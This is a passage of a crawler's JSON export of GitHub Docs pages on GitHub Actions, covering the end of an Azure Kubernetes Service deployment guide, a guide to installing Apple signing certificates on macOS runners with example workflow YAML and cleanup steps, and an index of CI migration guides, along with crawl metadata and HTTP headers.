id: bake - name: Deploys application uses: Azure/k8s-deploy@dd4bbd13a5abd2fc9ca8bdcb8aee152bb718fa78 with: manifests: ${{ steps.bake.outputs.manifestsBundle }} images: | ${{ env.AZURE_CONTAINER_REGISTRY }}.azurecr.io/${{ env.PROJECT_NAME }}:${{ github.sha }} imagepullsecrets: | ${{ env.PROJECT_NAME }} \nAdditional resources\nThe following resources may also be useful:\nFor the original workflow template, see azure-kubernetes-service.yml in the GitHub Actions starter-workflows repository.\nThe actions used to in this workflow are the official Azure Azure/login,Azure/aks-set-context, Azure/CLI, Azure/k8s-bake, and Azure/k8s-deployactions.\nFor more examples of GitHub Action workflows that deploy to Azure, see the actions-workflow-samples repository.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-kubernetes-service-d2bkb.html",
  "markdown": "# Deploying to Azure Kubernetes Service\n\nYou can deploy your project to Azure Kubernetes Service (AKS) as part of your continuous deployment (CD) workflows.\n\n## [Introduction](#introduction)\n\nThis guide explains how to use GitHub Actions to build and deploy a project to [Azure Kubernetes Service](https://azure.microsoft.com/services/kubernetes-service/).\n\nNote\n\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect). and [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure).\n\n## [Prerequisites](#prerequisites)\n\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\n\n1.  Create a target AKS cluster and an Azure Container Registry (ACR). For more information, see [Quickstart: Deploy an AKS cluster by using the Azure portal - Azure Kubernetes Service](https://docs.microsoft.com/azure/aks/kubernetes-walkthrough-portal) and [Quickstart - Create registry in portal - Azure Container Registry](https://docs.microsoft.com/azure/container-registry/container-registry-get-started-portal) in the Azure documentation.\n    \n2.  Create a secret called `AZURE_CREDENTIALS` to store your Azure credentials. For more information about how to find this information and structure the secret, see [the `Azure/login` action documentation](https://github.com/Azure/login#configure-a-service-principal-with-a-secret).\n    \n\n## [Creating the workflow](#creating-the-workflow)\n\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\n\nThe following example workflow demonstrates how to build and deploy a project to Azure Kubernetes Service when code is pushed to your repository.\n\nUnder the workflow `env` key, change the following values:\n\n*   `AZURE_CONTAINER_REGISTRY` to the name of your container registry\n*   `PROJECT_NAME` to the name of your project\n*   `RESOURCE_GROUP` to the resource group containing your AKS cluster\n*   `CLUSTER_NAME` to the name of your AKS cluster\n\nThis workflow uses the `helm` render engine for the [`azure/k8s-bake` action](https://github.com/Azure/k8s-bake). If you will use the `helm` render engine, change the value of `CHART_PATH` to the path to your helm file. Change `CHART_OVERRIDE_PATH` to an array of override file paths. If you use a different render engine, update the input parameters sent to the `azure/k8s-bake` action.\n\nYAML\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Build and deploy to Azure Kubernetes Service\n\nenv:\n  AZURE_CONTAINER_REGISTRY: MY_REGISTRY_NAME # set this to the name of your container registry\n  PROJECT_NAME: MY_PROJECT_NAME              # set this to your project's name\n  RESOURCE_GROUP: MY_RESOURCE_GROUP          # set this to the resource group containing your AKS cluster\n  CLUSTER_NAME: MY_CLUSTER_NAME              # set this to the name of your AKS cluster\n  REGISTRY_URL: MY_REGISTRY_URL              # set this to the URL of your registry\n  # If you bake using helm:\n  CHART_PATH: MY_HELM_FILE                   # set this to the path to your helm file\n  CHART_OVERRIDE_PATH: MY_OVERRIDE_FILES     # set this to an array of override file paths\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n\n    - name: Azure Login\n      uses: azure/login@14a755a4e2fd6dff25794233def4f2cf3f866955\n      with:\n        creds: ${{ secrets.AZURE_CREDENTIALS }}\n\n    - name: Build image on ACR\n      uses: azure/CLI@61bb69d64d613b52663984bf12d6bac8fd7b3cc8\n      with:\n        azcliversion: 2.29.1\n        inlineScript: |\n          az configure --defaults acr=${{ env.AZURE_CONTAINER_REGISTRY }}\n          az acr build -t -t ${{ env.REGISTRY_URL }}/${{ env.PROJECT_NAME }}:${{ github.sha }}\n\n    - name: Gets K8s context\n      uses: azure/aks-set-context@94ccc775c1997a3fcfbfbce3c459fec87e0ab188\n      with:\n          creds: ${{ secrets.AZURE_CREDENTIALS }}\n          resource-group: ${{ env.RESOURCE_GROUP }}\n          cluster-name: ${{ env.CLUSTER_NAME }}\n      id: login\n\n    - name: Configure deployment\n      uses: azure/k8s-bake@61041e8c2f75c1f01186c8f05fb8b24e1fc507d8\n      with:\n        renderEngine: 'helm'\n        helmChart: ${{ env.CHART_PATH }}\n        overrideFiles: ${{ env.CHART_OVERRIDE_PATH }}\n        overrides: |\n          replicas:2\n        helm-version: 'latest'\n      id: bake\n\n    - name: Deploys application\n      uses: Azure/k8s-deploy@dd4bbd13a5abd2fc9ca8bdcb8aee152bb718fa78\n      with:\n        manifests: ${{ steps.bake.outputs.manifestsBundle }}\n        images: |\n          ${{ env.AZURE_CONTAINER_REGISTRY }}.azurecr.io/${{ env.PROJECT_NAME }}:${{ github.sha }}\n        imagepullsecrets: |\n          ${{ env.PROJECT_NAME }}\n```\n\n## [Additional resources](#additional-resources)\n\nThe following resources may also be useful:\n\n*   For the original workflow template, see [`azure-kubernetes-service.yml`](https://github.com/actions/starter-workflows/blob/main/deployments/azure-kubernetes-service.yml) in the GitHub Actions `starter-workflows` repository.\n*   The actions used to in this workflow are the official Azure [`Azure/login`](https://github.com/Azure/login),[`Azure/aks-set-context`](https://github.com/Azure/aks-set-context), [`Azure/CLI`](https://github.com/Azure/CLI), [`Azure/k8s-bake`](https://github.com/Azure/k8s-bake), and [`Azure/k8s-deploy`](https://github.com/Azure/k8s-deploy)actions.\n*   For more examples of GitHub Action workflows that deploy to Azure, see the [actions-workflow-samples](https://github.com/Azure/actions-workflow-samples) repository.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 249,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-kubernetes-service-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-kubernetes-service-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-kubernetes-service-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-kubernetes-service-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-deploying-to-azure-kubernetes-service-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 9527,
      "readableText": 9124,
      "none": 34632,
      "readableTextIfPossible": 34632,
      "result": 9124,
      "markdown": 6396
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development",
    "loadedTime": "2025-05-08T06:40:59.017Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development",
    "title": "Installing an Apple certificate on macOS runners for Xcode development - GitHub Docs",
    "description": "You can sign Xcode apps within your continuous integration (CI) workflow by installing an Apple code signing certificate on GitHub Actions runners.",
    "author": null,
    "keywords": "CI,Xcode",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Installing an Apple certificate on macOS runners for Xcode development - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "4BEA:616BA:100AC36:149B5FB:681C51F4",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:52 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686452.411739, VS0, VE276",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28073",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Installing an Apple certificate on macOS runners for Xcode development\nYou can sign Xcode apps within your continuous integration (CI) workflow by installing an Apple code signing certificate on GitHub Actions runners.\nIntroduction\nThis guide shows you how to add a step to your continuous integration (CI) workflow that installs an Apple code signing certificate and provisioning profile on GitHub Actions runners. This will allow you to sign your Xcode apps for publishing to the Apple App Store, or distributing it to test groups.\nPrerequisites\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\nWriting workflows\nWorkflow syntax for GitHub Actions\nYou should have an understanding of Xcode app building and signing. For more information, see the Apple developer documentation.\nCreating secrets for your certificate and provisioning profile\nThe signing process involves storing certificates and provisioning profiles, transferring them to the runner, importing them to the runner's keychain, and using them in your build.\nTo use your certificate and provisioning profile on a runner, we strongly recommend that you use GitHub secrets. For more information on creating secrets and using them in a workflow, see Using secrets in GitHub Actions.\nCreate secrets in your repository or organization for the following items:\nYour Apple signing certificate.\nThis is your p12 certificate file. For more information on exporting your signing certificate from Xcode, see the Xcode documentation.\nYou should convert your certificate to Base64 when saving it as a secret. In this example, the secret is named BUILD_CERTIFICATE_BASE64.\nUse the following command to convert your certificate to Base64 and copy it to your clipboard:\nbase64 -i BUILD_CERTIFICATE.p12 | pbcopy \nThe password for your Apple signing certificate.\nIn this example, the secret is named P12_PASSWORD.\nYour Apple provisioning profile.\nFor more information on exporting your provisioning profile from Xcode, see the Xcode documentation.\nYou should convert your provisioning profile to Base64 when saving it as a secret. In this example, the secret is named BUILD_PROVISION_PROFILE_BASE64.\nUse the following command to convert your provisioning profile to Base64 and copy it to your clipboard:\nbase64 -i PROVISIONING_PROFILE.mobileprovision | pbcopy \nA keychain password.\nA new keychain will be created on the runner, so the password for the new keychain can be any new random string. In this example, the secret is named KEYCHAIN_PASSWORD.\nAdd a step to your workflow\nThis example workflow includes a step that imports the Apple certificate and provisioning profile from the GitHub secrets, and installs them on the runner.\nYAML\nname: App build on: push jobs: build_with_signing: runs-on: macos-latest steps: - name: Checkout repository uses: actions/checkout@v4 - name: Install the Apple certificate and provisioning profile env: BUILD_CERTIFICATE_BASE64: ${{ secrets.BUILD_CERTIFICATE_BASE64 }} P12_PASSWORD: ${{ secrets.P12_PASSWORD }} BUILD_PROVISION_PROFILE_BASE64: ${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }} KEYCHAIN_PASSWORD: ${{ secrets.KEYCHAIN_PASSWORD }} run: | # create variables CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12 PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db # import certificate and provisioning profile from secrets echo -n \"$BUILD_CERTIFICATE_BASE64\" | base64 --decode -o $CERTIFICATE_PATH echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" | base64 --decode -o $PP_PATH # create temporary keychain security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security set-keychain-settings -lut 21600 $KEYCHAIN_PATH security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH # import certificate to keychain security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH security list-keychain -d user -s $KEYCHAIN_PATH # apply provisioning profile mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles - name: Build app # ... \nNote\nFor iOS build targets, your provisioning profile should have the extension .mobileprovision. For macOS build targets, the extension should be .provisionprofile. The example workflow above should be updated to reflect your target platform.\nRequired clean-up on self-hosted runners\nGitHub-hosted runners are isolated virtual machines that are automatically destroyed at the end of the job execution. This means that the certificates and provisioning profile used on the runner during the job will be destroyed with the runner when the job is completed.\nOn self-hosted runners, the $RUNNER_TEMP directory is cleaned up at the end of the job execution, but the keychain and provisioning profile might still exist on the runner.\nIf you use self-hosted runners, you should add a final step to your workflow to help ensure that these sensitive files are deleted at the end of the job. The workflow step shown below is an example of how to do this.\n- name: Clean up keychain and provisioning profile if: ${{ always() }} run: | security delete-keychain $RUNNER_TEMP/app-signing.keychain-db rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-installing-an-apple-certificate-on-macos-runners-for-xcode-development-rb7k7.html",
  "markdown": "# Installing an Apple certificate on macOS runners for Xcode development\n\nYou can sign Xcode apps within your continuous integration (CI) workflow by installing an Apple code signing certificate on GitHub Actions runners.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to add a step to your continuous integration (CI) workflow that installs an Apple code signing certificate and provisioning profile on GitHub Actions runners. This will allow you to sign your Xcode apps for publishing to the Apple App Store, or distributing it to test groups.\n\n## [Prerequisites](#prerequisites)\n\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\n\n*   [Writing workflows](https://docs.github.com/en/actions/learn-github-actions)\n*   [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)\n\nYou should have an understanding of Xcode app building and signing. For more information, see the [Apple developer documentation](https://developer.apple.com/documentation/).\n\n## [Creating secrets for your certificate and provisioning profile](#creating-secrets-for-your-certificate-and-provisioning-profile)\n\nThe signing process involves storing certificates and provisioning profiles, transferring them to the runner, importing them to the runner's keychain, and using them in your build.\n\nTo use your certificate and provisioning profile on a runner, we strongly recommend that you use GitHub secrets. For more information on creating secrets and using them in a workflow, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions).\n\nCreate secrets in your repository or organization for the following items:\n\n*   Your Apple signing certificate.\n    \n    *   This is your `p12` certificate file. For more information on exporting your signing certificate from Xcode, see the [Xcode documentation](https://help.apple.com/xcode/mac/current/#/dev154b28f09).\n        \n    *   You should convert your certificate to Base64 when saving it as a secret. In this example, the secret is named `BUILD_CERTIFICATE_BASE64`.\n        \n    *   Use the following command to convert your certificate to Base64 and copy it to your clipboard:\n        \n        ```\n        base64 -i BUILD_CERTIFICATE.p12 | pbcopy\n        ```\n        \n*   The password for your Apple signing certificate.\n    \n    *   In this example, the secret is named `P12_PASSWORD`.\n*   Your Apple provisioning profile.\n    \n    *   For more information on exporting your provisioning profile from Xcode, see the [Xcode documentation](https://help.apple.com/xcode/mac/current/#/deva899b4fe5).\n        \n    *   You should convert your provisioning profile to Base64 when saving it as a secret. In this example, the secret is named `BUILD_PROVISION_PROFILE_BASE64`.\n        \n    *   Use the following command to convert your provisioning profile to Base64 and copy it to your clipboard:\n        \n        ```\n        base64 -i PROVISIONING_PROFILE.mobileprovision | pbcopy\n        ```\n        \n*   A keychain password.\n    \n    *   A new keychain will be created on the runner, so the password for the new keychain can be any new random string. In this example, the secret is named `KEYCHAIN_PASSWORD`.\n\n## [Add a step to your workflow](#add-a-step-to-your-workflow)\n\nThis example workflow includes a step that imports the Apple certificate and provisioning profile from the GitHub secrets, and installs them on the runner.\n\nYAML\n\n```\nname: App build\non: push\n\njobs:\n  build_with_signing:\n    runs-on: macos-latest\n\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      - name: Install the Apple certificate and provisioning profile\n        env:\n          BUILD_CERTIFICATE_BASE64: ${{ secrets.BUILD_CERTIFICATE_BASE64 }}\n          P12_PASSWORD: ${{ secrets.P12_PASSWORD }}\n          BUILD_PROVISION_PROFILE_BASE64: ${{ secrets.BUILD_PROVISION_PROFILE_BASE64 }}\n          KEYCHAIN_PASSWORD: ${{ secrets.KEYCHAIN_PASSWORD }}\n        run: |\n          # create variables\n          CERTIFICATE_PATH=$RUNNER_TEMP/build_certificate.p12\n          PP_PATH=$RUNNER_TEMP/build_pp.mobileprovision\n          KEYCHAIN_PATH=$RUNNER_TEMP/app-signing.keychain-db\n\n          # import certificate and provisioning profile from secrets\n          echo -n \"$BUILD_CERTIFICATE_BASE64\" | base64 --decode -o $CERTIFICATE_PATH\n          echo -n \"$BUILD_PROVISION_PROFILE_BASE64\" | base64 --decode -o $PP_PATH\n\n          # create temporary keychain\n          security create-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n          security set-keychain-settings -lut 21600 $KEYCHAIN_PATH\n          security unlock-keychain -p \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n\n          # import certificate to keychain\n          security import $CERTIFICATE_PATH -P \"$P12_PASSWORD\" -A -t cert -f pkcs12 -k $KEYCHAIN_PATH\n          security set-key-partition-list -S apple-tool:,apple: -k \"$KEYCHAIN_PASSWORD\" $KEYCHAIN_PATH\n          security list-keychain -d user -s $KEYCHAIN_PATH\n\n          # apply provisioning profile\n          mkdir -p ~/Library/MobileDevice/Provisioning\\ Profiles\n          cp $PP_PATH ~/Library/MobileDevice/Provisioning\\ Profiles\n      - name: Build app\n          # ...\n```\n\nNote\n\nFor iOS build targets, your provisioning profile should have the extension `.mobileprovision`. For macOS build targets, the extension should be `.provisionprofile`. The example workflow above should be updated to reflect your target platform.\n\n## [Required clean-up on self-hosted runners](#required-clean-up-on-self-hosted-runners)\n\nGitHub-hosted runners are isolated virtual machines that are automatically destroyed at the end of the job execution. This means that the certificates and provisioning profile used on the runner during the job will be destroyed with the runner when the job is completed.\n\nOn self-hosted runners, the `$RUNNER_TEMP` directory is cleaned up at the end of the job execution, but the keychain and provisioning profile might still exist on the runner.\n\nIf you use self-hosted runners, you should add a final step to your workflow to help ensure that these sensitive files are deleted at the end of the job. The workflow step shown below is an example of how to do this.\n\n```\n- name: Clean up keychain and provisioning profile\n  if: ${{ always() }}\n  run: |\n    security delete-keychain $RUNNER_TEMP/app-signing.keychain-db\n    rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 243,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-installing-an-apple-certificate-on-macos-runners-for-xcode-development-originalHtm",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-installing-an-apple-certificate-on-macos-runners-for-xcode-development-removedElem",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-installing-an-apple-certificate-on-macos-runners-for-xcode-development-extractusHt",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-installing-an-apple-certificate-on-macos-runners-for-xcode-development-readableTex",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-deploying-installing-an-apple-certificate-on-macos-runners-for-xcode-development-readableTex"
    },
    "lengths": {
      "extractus": 9710,
      "readableText": 9192,
      "none": 34779,
      "readableTextIfPossible": 9192,
      "result": 9192,
      "markdown": 6549
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions",
    "loadedTime": "2025-05-08T06:41:02.814Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions",
    "title": "Manually migrating to GitHub Actions - GitHub Docs",
    "description": "Learn how to manually migrate your existing CI/CD workflows to GitHub Actions.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Manually migrating to GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "C732:616BA:100B5A3:149C107:681C51F7",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:56 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686456.828802, VS0, VE220",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "22939",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Manually migrating to GitHub Actions\nLearn how to manually migrate your existing CI/CD workflows to GitHub Actions.\nMigrating from Azure Pipelines to GitHub Actions\nGitHub Actions and Azure Pipelines share several configuration similarities, which makes migrating to GitHub Actions relatively straightforward.\nMigrating from CircleCI to GitHub Actions\nGitHub Actions and CircleCI share several similarities in configuration, which makes migration to GitHub Actions relatively straightforward.\nMigrating from GitLab CI/CD to GitHub Actions\nGitHub Actions and GitLab CI/CD share several configuration similarities, which makes migrating to GitHub Actions relatively straightforward.\nMigrating from Jenkins to GitHub Actions\nGitHub Actions and Jenkins share multiple similarities, which makes migration to GitHub Actions relatively straightforward.\nMigrating from Travis CI to GitHub Actions\nGitHub Actions and Travis CI share multiple similarities, which helps make it relatively straightforward to migrate to GitHub Actions.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-4hgcj.html",
  "markdown": "# Manually migrating to GitHub Actions\n\nLearn how to manually migrate your existing CI/CD workflows to GitHub Actions.\n\n## [Migrating from Azure Pipelines to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions)\n\nGitHub Actions and Azure Pipelines share several configuration similarities, which makes migrating to GitHub Actions relatively straightforward.\n\n## [Migrating from CircleCI to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions)\n\nGitHub Actions and CircleCI share several similarities in configuration, which makes migration to GitHub Actions relatively straightforward.\n\n## [Migrating from GitLab CI/CD to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions)\n\nGitHub Actions and GitLab CI/CD share several configuration similarities, which makes migrating to GitHub Actions relatively straightforward.\n\n## [Migrating from Jenkins to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions)\n\nGitHub Actions and Jenkins share multiple similarities, which makes migration to GitHub Actions relatively straightforward.\n\n## [Migrating from Travis CI to GitHub Actions](https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions)\n\nGitHub Actions and Travis CI share multiple similarities, which helps make it relatively straightforward to migrate to GitHub Actions.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 230,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 2021,
      "readableText": 2360,
      "none": 22007,
      "readableTextIfPossible": 22007,
      "result": 2360,
      "markdown": 1786
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows",
  "crawl": {
